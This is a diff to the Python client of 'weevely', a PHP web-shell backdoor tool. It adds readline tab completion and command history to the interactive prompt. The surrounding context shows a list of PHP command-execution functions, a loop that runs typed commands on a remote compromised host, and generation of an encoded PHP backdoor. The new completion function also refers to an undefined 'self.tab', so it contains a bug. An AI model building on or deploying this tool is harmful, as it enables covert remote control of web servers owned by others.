@@ -1,8 +1,32 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import getopt, sys, base64, os, urllib2, re, urlparse, os, random
+import getopt, sys, base64, os, urllib2, re, urlparse, os, random, readline, rlcompleter, atexit
 
+history = os.path.expanduser( '~/.weevely_history' )
+	
+def autoComplete( text, state ):
+	matches = []
+	items   = readline.get_current_history_length()
+	for i in range( items ):
+		item = readline.get_history_item(i)
+		if item != None and item.startswith(text):
+			matches.append(item)
+	
+	if text == '':
+		readline.insert_text( self.tab )
+		return None
+	else:
+		return matches[state]
+
+try:
+    readline.parse_and_bind( 'tab: complete' )
+    readline.set_completer( autoComplete )
+    readline.read_history_file(history)
+ 
+    atexit.register( readline.write_history_file, history )
+except IOError:
+    pass
     
 methods= [ "system()", "passthru()", "popen()", "exec()", "proc_open()", "shell_exec()", "pcntl_exec()", "perl->system()", "python_eval()" ]
 
@@ -157,10 +181,10 @@ class weevely:
     hostname=urlparse.urlparse(url)[1]
     
     while True:
-      print hostname + '> ',
-      cmnd = sys.stdin.readline().strip()
-      if cmnd!='\n':
-	print self.host.execute(cmnd)
+		cmnd = raw_input( hostname + '> ' )
+		if cmnd!='\n':
+			readline.add_history(cmnd)
+			print self.host.execute(cmnd)
 
   def generate(self,key,path):
     f_tocrypt = file('php/encoded_backdoor.php')
